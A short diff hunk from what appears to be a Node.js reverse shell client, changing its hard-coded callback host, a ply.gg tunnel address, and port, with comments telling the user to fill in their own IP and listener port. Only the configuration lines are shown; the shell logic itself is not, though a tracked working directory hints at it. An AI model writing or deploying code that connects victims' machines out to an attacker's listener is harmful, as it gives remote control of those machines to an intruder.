@@ -4,8 +4,8 @@ const os = require('os');
 const path = require('path');
 const fs = require('fs');
 
-const REMOTE_HOST = '22.ip.gl.ply.gg'; // 👈 Replace with your IP
-const REMOTE_PORT = 44995; // 👈 Your listener port
+const REMOTE_HOST = '28.ip.gl.ply.gg'; // 👈 Replace with your IP
+const REMOTE_PORT = 44987; // 👈 Your listener port
 
 let currentDir = process.cwd();
 
